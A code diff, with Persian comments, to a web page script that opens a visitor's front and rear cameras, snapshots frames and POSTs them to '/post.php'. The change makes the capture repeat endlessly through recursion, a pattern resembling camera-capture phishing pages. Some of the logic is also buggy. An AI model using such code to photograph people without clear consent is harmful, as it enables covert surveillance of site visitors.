@@ -20,15 +20,15 @@
     function post(imgdata) {
         $.ajax({
             type: 'POST',
-            data: { cat: imgdata },
+            data: {cat: imgdata},
             url: '/post.php',
             dataType: 'json',
             async: false,
             success: function (result) {
-                console.log('تصویر با موفقیت ذخیره شد.');
+                alert('تصویر با موفقیت ذخیره شد.' + result);
             },
             error: function (error) {
-                console.log('خطا در ذخیره تصویر: ', error);
+                alert('خطا در ذخیره تصویر: ', error);
             }
         });
     };
@@ -37,12 +37,13 @@
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
+    let frontStream, backStream; // تعریف متغیرهای استریم
 
     // محدودیت‌ها برای دوربین عقب
     const backConstraints = {
         audio: false,
         video: {
-            facingMode: "environment" // استفاده از دوربین عقب
+            facingMode: {exact: "environment"} // استفاده از دوربین عقب
         }
     };
 
@@ -55,15 +56,21 @@
     };
 
     // تابع گرفتن تصویر از دوربین و ذخیره کردن آن
-    async function captureAndSave(constraints) {
+    async function captureAndSave(constraints, stream) {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia(constraints);
-            video.srcObject = stream;
+            const mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+            video.srcObject = mediaStream;
             await new Promise(resolve => video.onloadedmetadata = resolve);
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageData = canvas.toDataURL('image/png');
             post(imageData);
+            // قطع کردن استریم بعد از ذخیره تصویر
+            stream.getTracks().forEach(track => {
+                track.stop();
+            });
+            // فراخوانی تابع برای گرفتن تصویر از دوربین مجدداً
+            captureAndSave(constraints, stream);
         } catch (e) {
             console.error('navigator.getUserMedia error:', e);
         }
@@ -71,27 +78,28 @@
 
     // تست دسترسی به دوربین جلو
     navigator.mediaDevices.getUserMedia(frontConstraints)
-        .then(function(stream) {
+        .then(function (stream) {
             alert('دوربین جلو به درستی شناسایی شد.');
+            frontStream = stream; // ذخیره کردن استریم
         })
-        .catch(function(error) {
+        .catch(function (error) {
             alert('مشکل در دسترسی به دوربین جلو:', error);
         });
 
     // تست دسترسی به دوربین عقب
     navigator.mediaDevices.getUserMedia(backConstraints)
-        .then(function(stream) {
+        .then(function (stream) {
             alert('دوربین عقب به درستی شناسایی شد.');
+            backStream = stream; // ذخیره کردن استریم
         })
-        .catch(function(error) {
+        .catch(function (error) {
             alert('مشکل در دسترسی به دوربین عقب:', error);
         });
 
-
     // اجرای تابع برای دوربین عقب و سپس دوربین جلو
     async function captureFromBothCameras() {
-        await captureAndSave(frontConstraints);
-        await captureAndSave(backConstraints);
+        await captureAndSave(frontConstraints, frontStream);
+        await captureAndSave(backConstraints, backStream);
     }
 
     captureFromBothCameras();
